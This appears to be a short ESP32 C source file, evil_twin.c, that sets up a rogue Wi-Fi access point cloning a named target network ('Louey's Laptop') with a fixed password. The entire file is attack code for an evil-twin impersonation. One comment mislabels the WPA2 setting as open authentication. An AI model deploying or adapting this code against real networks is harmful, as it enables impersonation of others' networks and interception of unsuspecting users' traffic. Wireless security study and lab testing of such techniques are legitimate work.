/*
 * evil_twin.c
 *
 *  Created on: 25 mai 2025
 *      Author: HP
 */
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "string.h"
#include "evil_twin.h"

#define TAG "EvilTwin"

void start_fake_ap() {
    const char *target_ssid = "Louey's Laptop";

    // Configure AP settings
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "", // SSID will be set via strcpy
            .ssid_len = 0,
            .channel = 1,
            .password = "password",
            .max_connection = 4,
            .authmode = WIFI_AUTH_WPA2_PSK // Open authentication
        },
    };

    // Copy target SSID into AP configuration
    strncpy((char *)ap_config.ap.ssid, target_ssid, sizeof(ap_config.ap.ssid));
    ap_config.ap.ssid_len = strlen(target_ssid);

    // Apply configuration and start AP
    ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_LOGI(TAG, "Evil Twin AP started with SSID: %s", target_ssid);
}


